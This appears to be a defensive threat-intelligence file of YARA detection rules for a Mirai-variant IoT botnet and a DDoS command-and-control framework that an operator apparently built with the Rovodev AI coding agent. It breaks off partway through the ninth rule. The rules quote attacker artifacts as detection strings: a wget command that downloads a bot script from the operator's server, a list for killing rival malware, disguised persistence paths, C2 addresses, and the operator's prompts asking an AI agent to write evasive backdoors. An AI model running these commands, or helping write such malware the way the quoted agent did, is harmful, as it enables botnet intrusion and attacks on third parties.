---
title: "Detection Rules — Rovodev AI Co-Authored Pandora-Mirai Variant + Matrix C2 Framework"
date: '2026-05-26'
layout: post
permalink: /hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/
hide: true
unlisted: true
---

**Campaign:** UTA-2026-014 / rovodev-mirai-matrix-c2-87.106.143.220
**Date:** 2026-05-26
**Author:** The Hunters Ledger
**License:** CC BY-NC 4.0
**Reference:** https://the-hunters-ledger.com/reports/rovodev-mirai-matrix-c2-87.106.143.220/

> **Note:** This is the per-case detection file for Sub-report 4 of 5 (Case 3) in the parent series `ai-agent-frameworks-2026-05-23`. Cross-operator AI-Generated Code Signature rules are in `ai-agent-frameworks-2026-05-23-detections.md` and are not duplicated here.

---

## Detection Coverage Summary

| Rule Type | Count | MITRE Techniques Covered | Overall FP Risk |
|---|---|---|---|
| YARA | 10 | T1027, T1037.004, T1053.003, T1059.006, T1059.007, T1095, T1498, T1587.001 | LOW–MEDIUM |
| Sigma | 12 | T1014, T1037.004, T1053.003, T1071.001, T1095, T1543.002, T1546.004, T1547.013, T1564.001, T1059.007, T1059.006, T1587.001 | LOW–MEDIUM |
| Suricata | 7 | T1071.001, T1095, T1498.001, T1498.002, T1587.001, T1584.004 | LOW |

**Priority distribution:** 5 HIGH / 9 MEDIUM / 5 LOW

**Calibration note — prior art:**
- Pandora-Mirai variant family traces to Doctor Web September 2023 (Tier 2 / B2); original scope was Android-TV only. The 11-architecture IoT extension documented here is first public characterization.
- AI-Generated Offensive Code Structural Signature: Google GTIG documents "verbose docstrings" + "textbook Pythonic format" for individual exploit scripts; the 5-criteria universal-subset signature confirmed cross-3-operators is net-new public characterization.
- Atlassian Rovodev abuse: first publicly-documented case (no prior art found in Tier 1–3 sources).
- MaaS hypothesis REFUTED (Phase 11): Pandora-Mirai is open-source shared ecosystem. This operator is a downstream adopter, not the variant author.

---

## YARA Rules

### Pandora-Mirai (Naku ELF Bot Suite)

---

### Rule 1 — MAL_ELF_Naku_Pandora_Mirai_Family

**Detection Priority:** HIGH
**Rationale:** Operator-bespoke 22-char charset `1gba4cdom53nhp12ei0kfj` is present in all 11 architectures (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86); single rule achieves cross-arch coverage. Combined with Sora-fork `/bin/busybox SORA` XOR-0x54-decoded marker and Mirai canonical symbols from the arm7 debug build, this rule achieves specific family identification at LOW FP risk.
**ATT&CK Coverage:** T1027 (Obfuscated Files or Information), T1095 (Non-Application Layer Protocol), T1498.001 (Direct Network Flood)
**Confidence:** HIGH — all strings confirmed DEFINITE cross-arch via byte-level analysis; charset present in all 11 release builds
**False Positive Risk:** LOW — 22-char charset is operator-bespoke and not found in any other host in Hunt.io 365-day index; `/bin/busybox SORA` is Sora-fork-specific and not present in stock Mirai or generic IoT tools; `PandoraNet` botnet ID is unique to this operator
**Deployment:** Endpoint ELF scanner, network sandbox detonation, IoT device firmware scanner, memory scanner on compromised Linux hosts

```yara
/*
   Yara Rule Set
   Identifier: Naku/Pandora-Mirai 11-arch IoT botnet (UTA-2026-014)
   Author: The Hunters Ledger
   Source: https://pixelatedcontinuum.github.io/Threat-Intel-Reports/
   License: CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/
*/

rule MAL_ELF_Naku_Pandora_Mirai_Family {
   meta:
      description = "Detects Naku/Pandora-Mirai 11-architecture IoT botnet based on operator-bespoke 22-char random-string charset, Sora-fork /bin/busybox SORA derivative marker (XOR-0x54 encoded), and canonical Mirai botnet symbols. Operator uses triple XOR keys (0x54/0x42/0x45); charset is present in all 11 release architectures and acts as cross-arch tracking signature."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "64afc3b3a02706ffcf4255bda4519f8c1c66daaaf937a2641fd14a551a34e383"
      hash2 = "595f4315f00c2fce839eabe9880f669990256d6638fb148996872e37ffc9b28a"
      hash3 = "afd49e3ceb20a8e861fa4804b6ea988f8aefd6942f84973f32b8e24c7df03410"
      family = "Pandora-Mirai"
      malware_type = "IoT Botnet"
      campaign = "UTA-2026-014"
      id = "2653771b-6124-5656-903c-cc65f43a21a5"
   strings:
      // Operator-bespoke 22-char random-string charset (XOR-0x54 encoded blob)
      // Decoded value: 1gba4cdom53nhp12ei0kfj
      // Raw XOR-0x54 encoded form in binary
      $charset_xor = { 65 33 36 35 60 37 30 3B 39 61 67 3A 3C 24 65 66 31 3D 64 3F 32 3E }
      // Sora-fork derivative: /bin/busybox SORA XOR-0x54 encoded
      // Distinguishes from stock Mirai /bin/busybox MIRAI
      $sora_xor = { 7B 36 3D 3A 36 21 27 36 3B 2C 74 24 27 20 61 }
      // PandoraNet operator botnet ID (plaintext in arm7 debug build and process args)
      $pandoranet = "PandoraNet" ascii fullword
      // Mirai canonical function symbols (arm7 debug build; these are DEFINITE Mirai-lineage markers)
      $sym_auth = "add_auth_entry" ascii fullword
      $sym_resolve = "resolve_cnc_addr" ascii fullword
      // .anime operator-bespoke marker (XOR-0x54 decoded)
      $anime_xor = { 7F 61 59 97 } // partial XOR-0x54 encoding of ".anime"
   condition:
      uint32(0) == 0x464C457F and
      filesize < 200KB and
      (
         ($charset_xor and $sora_xor) or
         ($charset_xor and $pandoranet) or
         ($sym_auth and $sym_resolve and $charset_xor) or
         ($pandoranet and $sym_auth and $sym_resolve)
      )
}
```

---

### Rule 2 — MAL_Bash_Pandora_Dropper_Family

**Detection Priority:** HIGH
**Rationale:** Pandora.sh / Naku.sh dropper class fetches binaries for all 11 architectures in a loop; the arch-iteration string pattern combined with operator-specific distribution URLs and execution-with-arch-tag is specific to this family. Two confirmed hashes (HTTPS-channel variant and standard variant) anchor the rule.
**ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1059.004 (Unix Shell), T1587.001 (Develop Capabilities: Malware)
**Confidence:** HIGH — dropper artifacts directly captured from operator infrastructure; arch-iteration-wget pattern is operator-specific
**False Positive Risk:** LOW — specific arch-set (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86) combined with Pandora/Naku naming and operator IP makes false positive production-impractical
**Deployment:** Linux filesystem scanner (bash scripts), web proxy log scanning for outbound fetches matching this pattern

```yara
rule MAL_Bash_Pandora_Dropper_Family {
   meta:
      description = "Detects pandora.sh / Naku.sh dropper class fetching 11-architecture Pandora-Mirai ELF binaries via wget/curl loop. Operator-specific arch-set (arm/arm5/arm6/arm7/m68k/mips/mpsl/ppc/sh4/spc/x86), execution-with-arch-tag pattern, and cleanup sequence identify this dropper family across both standard (port 80) and HTTPS-channel (port 443) variants."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17"
      family = "Pandora-Mirai"
      malware_type = "Dropper"
      campaign = "UTA-2026-014"
      id = "46df6422-622f-58e0-92fc-fd4110df274e"
   strings:
      // Architecture set — operator-specific subset with all 11 arches
      $arch_arm5   = "arm5" ascii
      $arch_arm6   = "arm6" ascii
      $arch_m68k   = "m68k" ascii
      $arch_mpsl   = "mpsl" ascii
      $arch_sh4    = "sh4"  ascii
      $arch_spc    = "spc"  ascii
      // Operator distribution host patterns
      $distrib_primary = "87.106.143.220" ascii
      $distrib_aruba   = "80.211.94.16" ascii
      // Binary naming conventions
      $bin_naku    = "Naku." ascii
      $bin_pandora = "Pandora." ascii
      // Execution-with-arch-tag pattern (argv-source-tagging)
      $exec_tag_r  = "./nig realtek" ascii
      $exec_tag_n  = "pandora_bot PandoraNet" ascii
      // Cleanup pattern
      $cleanup     = "rm -rf nig" ascii
   condition:
      filesize < 50KB and
      (
         (3 of ($arch_*) and ($bin_naku or $bin_pandora) and ($distrib_primary or $distrib_aruba)) or
         ($exec_tag_r and $cleanup and $distrib_aruba) or
         ($exec_tag_n and ($distrib_primary or $distrib_aruba))
      )
}
```

---

### Matrix C2 Python Framework (AI-Co-Authored via Rovodev)

---

### Rule 3 — MAL_Python_Matrix_C2_Framework_Family

**Detection Priority:** HIGH
**Rationale:** Direct AI-authored strings captured from Rovodev session_context.json file_write payloads. The combination of the MATRIX C2 ASCII-banner header, `mass_infection` docstring matching exactly with the session JSON, and the AI-Generated Code Signature emoji-branding pattern (🔥 ICMP Hell, 🚀 UDP Bypass) is uniquely specific to this framework. The `Increased default threads for 50Gbps+` operator-marketing comment is operator-authored and low-probability to appear in any legitimate code.
**ATT&CK Coverage:** T1059.006 (Python), T1498.001 (Direct Network Flood), T1498.002 (Reflection Amplification), T1587.001 (Develop Capabilities: Malware)
**Confidence:** HIGH — strings captured directly from Rovodev session JSON file_write tool call payloads; zero ambiguity on authorship
**False Positive Risk:** LOW — `MATRIX C2 - IMPLEMENTATION PLAN` banner + emoji-branded attack-method names combined with `50Gbps+` marketing comment is specific to this operator's framework; no known legitimate tool uses this combination
**Deployment:** Linux filesystem scanner (Python scripts), network sandbox detonation, SIEM content search on analyst workstations

```yara
rule MAL_Python_Matrix_C2_Framework_Family {
   meta:
      description = "Detects Matrix C2 Python DDoS-as-a-Service framework files authored via Atlassian Rovodev AI coding agent. Identifies master_control.py, attack_engine.py, and multi_vector_agent.py via AI-generated banner strings, operator-marketing comments, emoji-branded attack method catalog entries, and mass-infection docstring captured directly from Rovodev session file_write tool call payloads."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "e9e0eafc89e4a9db796c63bb4fdc5c0fd1106f8b9c234fb57e51a7934f2b8d8e"
      hash2 = "921e4c1d86813838d40010e82a8f374a70b91f06008db5182d1ec6c2da672c09"
      hash3 = "a19b972688158e361e8646ec17556ec46bf84f0cd24fb8707e4df85cb9d9a6d2"
      family = "Matrix C2"
      malware_type = "DDoS-as-a-Service Framework"
      campaign = "UTA-2026-014"
      id = "d804ea26-cbfc-5194-854c-228ee9cfc434"
   strings:
      // AI-generated ASCII-banner header (IMPLEMENTATION_PLAN.txt)
      $banner     = "MATRIX C2 - IMPLEMENTATION PLAN" ascii
      // AI-generated docstring captured in session_context.json file_write payload
      $docstring  = "Launch mass infection campaign" ascii
      // AI-Generated Code Signature #9 — emoji-in-output bleed in attack catalog
      $emoji_icmp = "\xf0\x9f\x94\xa5 ICMP Hell" ascii
      $emoji_udp  = "\xf0\x9f\x9a\x80 UDP Bypass" ascii
      // Operator-marketing comment inline in attack_engine.py source
      $gbps_claim = "Increased default threads for 50Gbps+" ascii
      // AI-Generated Documentation Signature — compounding-superlative naming
      $final_doc  = "FINAL_DEPLOYMENT_COMPLETE" ascii
      $ultimate   = "ULTIMATE_DEPLOYMENT" ascii
      // LLM closure phrase captured in IMPLEMENTATION_PLAN.txt
      $llm_close  = "Let me start Phase 1 now" ascii
      // Method dispatch table entries (attack_engine.py)
      $method_udp = "'udp-star'" ascii
      $method_syn = "'syn-storm'" ascii
      $method_ovh = "'ovh-nuke'" ascii
   condition:
      filesize < 2MB and
      (
         ($banner and ($docstring or $llm_close)) or
         ($gbps_claim and ($emoji_icmp or $emoji_udp)) or
         ($final_doc and $ultimate) or
         (2 of ($method_udp, $method_syn, $method_ovh) and ($gbps_claim or $docstring))
      )
}
```

---

### Rule 4 — MAL_Python_AIGenerated_OffensiveCode_Universal_Subset

**Detection Priority:** MEDIUM
**Rationale:** Cross-3-operator DEFINITE universal subset of the AI-Generated Code Structural Signature. Covers criteria #1 (verbose docstrings), #3 (educational variable names), #7 (bare-except + verbose-docstring co-occurrence), #9 (emoji-in-output bleed in offensive context), and #10 (version-numbered file persistence chain). No single criterion is sufficient alone; the multi-criteria gate reduces FP risk. Scope: cross-case rule applicable to operator-built AI-authored offensive Python tooling beyond this specific campaign.
**ATT&CK Coverage:** T1059.006 (Python), T1587.001 (Develop Capabilities: Malware)
**Confidence:** HIGH for the universal-subset criteria; MODERATE for any individual file match without corroborating context
**False Positive Risk:** MEDIUM — verbose docstrings and bare-except are common in legitimate Python code; rule requires multi-criteria co-occurrence to reduce FPs. Deploy with context review; flag for analyst triage rather than automated block. The emoji-in-offensive-context string narrows the FP surface significantly when present.
**Deployment:** Code repository scanner, Python script analyst triage, threat hunting in developer-accessible environments. Do NOT deploy as automated block — flag for analyst triage.

```yara
rule MAL_Python_AIGenerated_OffensiveCode_Universal_Subset {
   meta:
      description = "Cross-operator detection for AI-generated offensive Python code using the 5-criteria universal subset confirmed across 3 independent operators (Russian Gemini, Turkish ARPA, English Rovodev). Detects co-occurrence of verbose docstrings, bare-except handlers, educational variable naming, emoji-in-output bleed, and version-numbered iteration chains that are structurally diagnostic of AI-authored offensive tooling. High FP risk in isolation; requires multi-criteria co-occurrence gate."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "64ca12cae6f5e520abb4158da3bbc14e909c2128748ae0c5806fa4206cc14260"
      family = "AI-Generated Offensive Code"
      malware_type = "Offensive Python (AI-authored)"
      campaign = "ai-agent-frameworks-2026-05-23"
      id = "38aeca8a-3dad-5b61-9787-a14edf92a250"
   strings:
      // Criterion #7 — bare-except + verbose-docstring co-occurrence
      // (bare except in Python: "except:" or "except Exception:" + "pass")
      $bare_except1 = "except:" ascii
      $bare_except2 = "except Exception:" ascii
      $bare_pass    = /except[^\n]*:\s*\n\s*pass/ ascii
      // Criterion #1 / #3 — verbose docstrings with educational/operational naming
      $doc_attack   = /def \w+_attack\w*\(.*\):\s*\n\s+\"\"\"/ ascii
      $doc_flood    = /def \w+_flood\w*\(.*\):\s*\n\s+\"\"\"/ ascii
      $doc_scan     = /def \w+_scan\w*\(.*\):\s*\n\s+\"\"\"/ ascii
      $doc_infect   = /def \w+_infect\w*\(.*\):\s*\n\s+\"\"\"/ ascii
      // Criterion #9 — emoji-in-output bleed in offensive context
      $emoji_fire   = "\xf0\x9f\x94\xa5" ascii   // 🔥
      $emoji_rocket = "\xf0\x9f\x9a\x80" ascii   // 🚀
      $emoji_check  = "\xe2\x9c\x85"     ascii   // ✅
      // Criterion #10 — version-numbered file persistence chain
      $ver_chain_v2 = "_v2." ascii
      $ver_chain_v3 = "_v3." ascii
      $ver_chain_v4 = "_v4." ascii
      // Offensive context markers (required to anchor rule to malicious code, not legitimate tooling)
      $ctx_ddos  = "ddos" nocase ascii
      $ctx_flood = "flood" nocase ascii
      $ctx_brute = "brute" nocase ascii
      $ctx_infect = "infect" nocase ascii
      $ctx_cnc   = "cnc" nocase ascii
   condition:
      filesize < 500KB and
      // Must be Python
      (uint16(0) == 0x2123 or $bare_except1 or $bare_except2) and
      // Must have offensive context
      (1 of ($ctx_*)) and
      // Must have multiple AI-signature criteria
      (
         ($bare_pass and 1 of ($doc_*)) or
         (1 of ($emoji_*) and 1 of ($doc_*)) or
         (2 of ($ver_chain_v2, $ver_chain_v3, $ver_chain_v4) and 1 of ($doc_*))
      )
}
```

---

### Rule 5 — MAL_Discord_Bot_DDoSasService_Customer_Interface

**Detection Priority:** HIGH
**Rationale:** The JavaScript attack-method dispatch table with all 13 attack-method names, GBPS estimates, and VIP/free tier boolean fields is specific to this DDoS-as-a-Service platform. The emoji-branded method names (🔥 ICMP Hell, 🚀 UDP Bypass) are unlikely to appear in legitimate Discord bots. The combination of DDoS method names + tier model + specific GBPS claim is unique.
**ATT&CK Coverage:** T1059.007 (JavaScript), T1498.001 (Direct Network Flood), T1498.002 (Reflection Amplification)
**Confidence:** HIGH — dispatch table captured directly from Rovodev session JSON; method names confirmed in Discord bot source
**False Positive Risk:** LOW — specific combination of 13+ DDoS attack-method names with VIP tier model and GBPS estimates is not found in legitimate Discord bots; emoji branding narrows further
**Deployment:** JavaScript/Node.js file scanner, Discord bot code review, web application code analysis

```yara
rule MAL_Discord_Bot_DDoSasService_Customer_Interface {
   meta:
      description = "Detects Matrix C2 Discord-bot customer interface JavaScript dispatch table for DDoS-as-a-Service. Identifies the 13-attack-method catalog (udp-star, syn-storm, tcp-matrix, tcp-rst, udp-bypass, icmp-hell, multi-vector, http-flood, mass_infection, frag-storm, dns-rain, ovh-nuke, http-star) combined with VIP/free tier branding, GBPS capability estimates, and AI-Generated Code Signature emoji branding (🔥 🚀). Captured directly from Atlassian Rovodev session JSON rovodev.log."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "81748f0236319c678db39945ec77fffe1b33e84ffa9731b2836b911f8e83a5cc"
      family = "Matrix C2"
      malware_type = "DDoS-as-a-Service Bot Interface"
      campaign = "UTA-2026-014"
      id = "0f9967aa-bd3f-5fba-be62-bf75b119989b"
   strings:
      // Attack method names from dispatch table
      $m_udpstar  = "'udp-star'" ascii
      $m_synstorm = "'syn-storm'" ascii
      $m_tcpmat   = "'tcp-matrix'" ascii
      $m_tcprst   = "'tcp-rst'" ascii
      $m_bypass   = "'udp-bypass'" ascii
      $m_icmp     = "'icmp-hell'" ascii
      $m_multi    = "'multi-vector'" ascii
      $m_http     = "'http-flood'" ascii
      $m_infect   = "'mass_infection'" ascii
      $m_frag     = "'frag-storm'" ascii
      $m_dns      = "'dns-rain'" ascii
      $m_ovh      = "'ovh-nuke'" ascii
      $m_httpstar = "'http-star'" ascii
      // Tier model marker
      $tier_vip   = "vip: true" ascii
      $tier_free  = "vip: false" ascii
      // GBPS estimate field (operator-marketing data in dispatch table)
      $gbps_field = "gbps:" ascii
      // Emoji branding from attack catalog
      $emoji_icmp = "\xf0\x9f\x94\xa5 ICMP Hell" ascii
      $emoji_udp  = "\xf0\x9f\x9a\x80 UDP Bypass" ascii
   condition:
      filesize < 500KB and
      (
         (4 of ($m_*) and ($tier_vip or $tier_free)) or
         (3 of ($m_*) and $gbps_field and ($emoji_icmp or $emoji_udp)) or
         ($m_ovh and $m_frag and $m_infect and $tier_vip)
      )
}
```

---

### Operator Artifacts (Rovodev Session Artifacts)

---

### Rule 6 — MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt

**Detection Priority:** MEDIUM
**Rationale:** The `whatineed.txt` file is the operator's natural-language operational specification to Rovodev AI. The combination of C2-debugging request, GitHub C2-leak reference format, "automatic give me login" credential harvesting request, and Discord user-ID disclosure constitutes a specific adversarial-intent file pattern. This rule catches operator-prompt-class files that signal AI-co-authored offensive operations.
**ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware), T1059.006 (Python)
**Confidence:** HIGH for this operator's specific artifact; MODERATE for class-level detection (other operators may phrase prompts differently)
**False Positive Risk:** LOW — the combination of C2 debugging + exploit scanning + credential harvesting + Discord integration in a single text file is not a legitimate developer pattern; "automatic give me login" is an offensive-intent phrase with near-zero legitimate use
**Deployment:** Filesystem scanner on suspected operator hosts, web crawler for open-directory detection

```yara
rule MAL_Markdown_Rovodev_WhatINeed_OperatorPrompt {
   meta:
      description = "Detects whatineed.txt-class operator natural-language prompts to AI coding agents specifying offensive capability development. Pattern includes C2 debugging request, GitHub C2-leak repository reference, automatic credential harvesting ('automatic give me login'), Discord integration request, and operator user-ID disclosure. This operator's exact file captured from 87.106.143.220 open-directory."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "d888a16cd6aa76f62a329906db4f241e6bc23ff5f21d61e754ade8ccab6da0d0"
      family = "Rovodev Operator Artifacts"
      malware_type = "Operator Prompt (AI-Augmented Offensive Operations)"
      campaign = "UTA-2026-014"
      id = "3e3d1343-158e-5030-b682-3a90eb4966ef"
   strings:
      // Operator's exact C2-debug request phrase
      $c2_debug   = "c2 doesn't connect" ascii nocase
      // GitHub C2-Leak reference pattern (operator references upstream code source)
      $c2_leak    = "C2-Leak" ascii
      // Offensive-intent credential harvesting phrase
      $auto_login = "automatic give me login" ascii nocase
      // Discord integration request (operator's customer-facing channel)
      $discord_req = "make discord live" ascii nocase
      // Operator Discord user-ID disclosure
      $discord_id  = "1441591352927326259" ascii
      // Anti-forensic cleanup request
      $cleanup_req = "clean files not needed" ascii nocase
      // Escalation request ("modern methods" / "more stuff to make it stronger")
      $stronger    = "make it stronger" ascii nocase
   condition:
      filesize < 10KB and
      (
         ($c2_debug and $c2_leak) or
         ($auto_login and $discord_req) or
         ($discord_id and $cleanup_req) or
         ($c2_debug and $auto_login and $stronger)
      )
}
```

---

### Rule 7 — MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored

**Detection Priority:** MEDIUM
**Rationale:** `stealth_agent.py` combines anti-debug + anti-VM + sandbox checks + persistence + self-destruct + polymorphic payload in a single AI-authored Python file. The co-occurrence of these features with bare-except handlers, verbose docstrings, and the specific C2 endpoint `87.106.143.220:1337` is specific to this file. Refines AI-Generated Code Signature item #4 (zero anti-analysis = PROMPT-CONDITIONAL, not structural — escalated prompts produce AI-authored code WITH evasion features).
**ATT&CK Coverage:** T1014 (Rootkit), T1059.006 (Python), T1497.001 (System Checks), T1587.001 (Develop Capabilities: Malware)
**Confidence:** HIGH — file captured directly from Rovodev session JSON file_write tool call; C2 endpoint hardcoded and confirmed
**False Positive Risk:** LOW — specific C2 endpoint `87.106.143.220:1337` combined with self-destruct + anti-VM + rootkit keywords is not found in legitimate Python security tools
**Deployment:** Linux filesystem scanner (Python scripts), EDR behavioral monitoring for Python processes with anti-VM API calls

```yara
rule MAL_Python_StealthAgent_AntiDebug_AntiVM_AI_Authored {
   meta:
      description = "Detects stealth_agent.py-class AI-authored Python backdoor connecting to 87.106.143.220:1337. Authored via escalated Rovodev prompt producing anti-debug, anti-VM, sandbox evasion, process hiding, rootkit install, systemd/cron persistence, self-destruct, and polymorphic payload generation combined with bare-except AI-code signature. Refines AI-Generated Code Signature criterion #4 (zero anti-analysis is PROMPT-CONDITIONAL, not structural)."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "d1086ab3c06764ffd81492b4c723bda83bac19dc101c8542bc566e5888c92da3"
      family = "Matrix C2"
      malware_type = "Stealth Agent (AI-authored backdoor)"
      campaign = "UTA-2026-014"
      id = "d4482d80-a943-5693-86d2-773c22063b33"
   strings:
      // C2 endpoint (operator-OWNED Matrix C2 — hardcoded in agent)
      $cnc_ip     = "87.106.143.220" ascii
      $cnc_port   = "1337" ascii
      // Anti-analysis feature keywords (per Hunt aiBrief)
      $anti_debug = "anti_debug" ascii nocase
      $anti_vm    = "anti_vm" ascii nocase
      $sandbox_chk = "sandbox" ascii nocase
      // Rootkit + persistence features
      $rootkit    = "rootkit" ascii nocase
      $self_dest  = "self_destruct" ascii nocase
      $polymorphic = "polymorphic" ascii nocase
      // AES-256-GCM encryption markers (encrypted_agent.py siblings)
      $aes_gcm    = "AES-256-GCM" ascii
      $pbkdf2     = "PBKDF2" ascii
      $handshake  = "handshake" ascii nocase
      // AI-Generated Code Signature bare-except (structural AI-authorship marker)
      $bare_exc   = "except:" ascii
   condition:
      filesize < 500KB and
      $cnc_ip and
      (
         (2 of ($anti_debug, $anti_vm, $sandbox_chk) and ($rootkit or $self_dest)) or
         ($aes_gcm and $pbkdf2 and $handshake) or
         ($polymorphic and $bare_exc and $cnc_port)
      )
}
```

---

### Rule 8 — MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring

**Detection Priority:** MEDIUM
**Rationale:** Captures operator-exposed Rovodev session_context.json and rovodev.log files that document the AI co-authoring workflow in detail. The `file_write` tool call pattern with `initial_content` payload starting with Python shebang lines, combined with `session_context.json` filename and large file size (1.24 MB), is specific to AI coding-agent session artifacts. Useful for hunting exposed operator-OPSEC failures on web servers.
**ATT&CK Coverage:** T1587.001 (Develop Capabilities: Malware)
**Confidence:** HIGH for this specific operator's session artifacts; HIGH for Rovodev-class session JSON pattern generally
**False Positive Risk:** LOW for the specific keyword combination; MEDIUM for `session_context.json` alone (legitimate app uses). Require multiple field co-occurrence.
**Deployment:** Web crawler for open-directory detection, filesystem scanner on suspected operator hosts

```yara
rule MAL_JSON_Rovodev_SessionContext_FileWrite_Authoring {
   meta:
      description = "Detects operator-exposed Atlassian Rovodev AI coding agent session artifacts (session_context.json / rovodev.log) containing file_write tool calls with offensive Python initial_content payloads. These session JSONs document end-to-end AI co-authoring of offensive frameworks. The 257b6faf session (1.24 MB) and 8b911ec6 session (176 KB) captured from operator's 87.106.143.220 open-directory are the primary artifact class."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "9eece9f46bc420b53884d4292622621c9960459c1d7a73635420771e7d0aa1fa"
      family = "Rovodev Operator Artifacts"
      malware_type = "AI Coding Agent Session Artifact"
      campaign = "UTA-2026-014"
      id = "826c0fe7-b1fc-5689-9fd7-69e2abc40277"
   strings:
      // Rovodev session JSON key patterns
      $session_key = "session_context" ascii
      $tool_call   = "file_write" ascii
      $init_content = "initial_content" ascii
      // Rovodev log file pattern
      $rovo_log    = "rovodev.log" ascii
      // Python shebang in file_write payloads (offensive Python content)
      $py_shebang  = "#!/usr/bin/env python3" ascii
      // Session UUID patterns (operator's two sessions)
      $sess_257    = "257b6faf-6426-47e9-8458-381befca3ef5" ascii
      $sess_8b9    = "8b911ec6-186f-423a-aa74-7b5d17e4d9ca" ascii
      // AI-generated offensive content markers within session
      $mass_infect = "Launch mass infection campaign" ascii
      $c2_header   = "MATRIX C2" ascii
   condition:
      filesize < 2MB and
      (
         ($session_key and $tool_call and $init_content and $py_shebang) or
         ($sess_257 or $sess_8b9) or
         ($tool_call and $mass_infect) or
         ($rovo_log and $c2_header)
      )
}
```

---

### Rule 9 — MAL_Python_Persistent_Bot_DualChannel_CNC

**Detection Priority:** MEDIUM
**Rationale:** `persistent_bot.sh`-class operators scripts implement the 5-vector persistence pattern plus dual-channel CNC architecture (HTTPS:443 build/test + HTTP:80 deploy). The `bot_register` JSON message with `bot_type` + `arch` + `vendor` fields sent to `87.106.143.220:1337` via netcat is specific to this operator's wire format. The 5-persistence-vector pattern (cron .cache_update + rc.local + init.d/sysupdate + systemd system-update.service + bashrc/profile) is a trackable operator signature.
**ATT&CK Coverage:** T1037.004 (RC Scripts), T1053.003 (Cron), T1059.004 (Unix Shell), T1071.001 (Web Protocols), T1543.002 (Systemd Service), T1546.004 (Unix Shell Configuration Modification)
**Confidence:** HIGH — script captured directly from operator infrastructure at known hash; all field patterns confirmed
**False Positive Risk:** LOW — specific JSON wire format (`bot_type`, `arch`, `vendor` fields combined with `bot_register` type) to `87.106.143.220:1337` is unique to this operator; hidden `.cache_update` cron entry combined with `sysupdate` service narrows FP surface significantly
**Deployment:** Linux filesystem scanner (bash scripts), EDR persistence monitoring for cron/init.d/systemd creation events

```yara
rule MAL_Python_Persistent_Bot_DualChannel_CNC {
   meta:
      description = "Detects persistent_bot.sh-class operator scripts implementing 5-vector Linux persistence and dual-channel CNC architecture. Identifies operator-specific JSON wire format (bot_register + heartbeat messages with bot_type/arch/vendor fields) to Matrix C2 at 87.106.143.220:1337, hidden cron entry /etc/cron.d/.cache_update, and masquerade persistence (sysupdate init.d service + system-update.service systemd unit)."
      license = "CC BY-NC 4.0 - https://creativecommons.org/licenses/by-nc/4.0/"
      author = "The Hunters Ledger"
      reference = "https://the-hunters-ledger.com/hunting-detections/rovodev-mirai-matrix-c2-87.106.143.220-detections/"
      date = "2026-05-26"
      hash1 = "4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b"
      family = "Matrix C2"
      malware_type = "Persistence Installer (AI-authored)"
      campaign = "UTA-2026-014"
      id = "91f7bf1a-6620-50cf-81c0-ff7faf1328e3"
   strings:
      // JSON wire format — bot_register message fields
      $wire_reg   = "\"type\":\"bot_register\"" ascii
      $wire_arch  = "\"arch\":\"$arch\"" ascii
      $wire_vendor = "\"vendor\":\"$vendor\"" ascii
      $wire_hb    = "\"type\":\"heartbeat\"" ascii
      // C2 endpoint
      $cnc_ep     = "87.106.143.220" ascii
      $cnc_port   = "1337" ascii
      // Hidden cron entry (operator-specific filename)
      $cron_hidden = "/etc/cron.d/.cache_update" ascii
      // Masquerade persistence filenames
      $initd_mask  = "/etc/init.d/sysupdate" ascii
      $systemd_mask = "/etc/systemd/system/system-update.service" ascii
      // Reseed channel (persistence downloads from operator VPS)
      $reseed     = "wget -qO- http://87.106.143.220/bot.sh" ascii
      // Competitor kill list
      $kill_comp  = "pkill -9 -f \"(mirai|qbot|tsunami|gafgyt|bashlite|kaiten)\"" ascii
   condition:
      filesize < 50KB and
      (
         ($wire_reg and $cnc_ep) or
         ($cron_hidden and ($initd_mask or $systemd_mask)) or
         ($reseed and $kill_comp) or
